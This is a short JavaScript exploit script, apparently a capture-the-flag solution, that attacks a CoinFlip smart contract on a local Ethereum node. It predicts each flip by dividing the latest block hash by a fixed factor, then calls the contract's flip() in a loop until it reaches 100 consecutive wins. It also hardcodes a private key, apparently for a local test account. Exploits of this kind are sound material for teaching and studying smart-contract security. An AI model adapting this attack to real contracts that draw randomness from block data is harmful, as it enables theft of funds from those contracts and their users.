// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const coinFlip = require('./build/contracts/CoinFlip.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const contractAddress = coinFlip.networks[networkId].address;
  const contract = new web3.eth.Contract(coinFlip.abi, contractAddress);

  let wins = 0;
  const FACTOR = new BigNumber(
    '57896044618658097711785492504343953926634992332820282019728792003956564819968',
  );
  while (wins < 100) {
    // We get the current block number and the block's hash
    const blockNumber = await web3.eth.getBlockNumber();
    const blockHash = (await web3.eth.getBlock(blockNumber)).hash;

    // We cast the blockHash (which is hex) into a number using toBN.
    // For reasons unknown, we have to call BigNumber on it again for the BN
    // methods to be present on the object.
    const blockValue = new BigNumber(web3.utils.toBN(blockHash));

    const coinFlip = blockValue.div(FACTOR); // blockValue / FACTOR

    // As we're dividing integers and since there is no implicit type coversion
    // Solidity rounds down: https://github.com/ConsenSys/smart-contract-best-practices/blob/master/docs/recommendations.md#beware-rounding-with-integer-division
    const guess = Math.floor(coinFlip.toNumber()) === 1;

    // Once we have our guess, we send it to the contract to gamble.
    await contract.methods.flip(guess).send({from: publicKey});

    // We call the public consecutiveWins getter to check how often we still
    // have to win.
    wins = await contract.methods.consecutiveWins().call({from: publicKey});
    console.log('Wins:', wins);
  }
})();
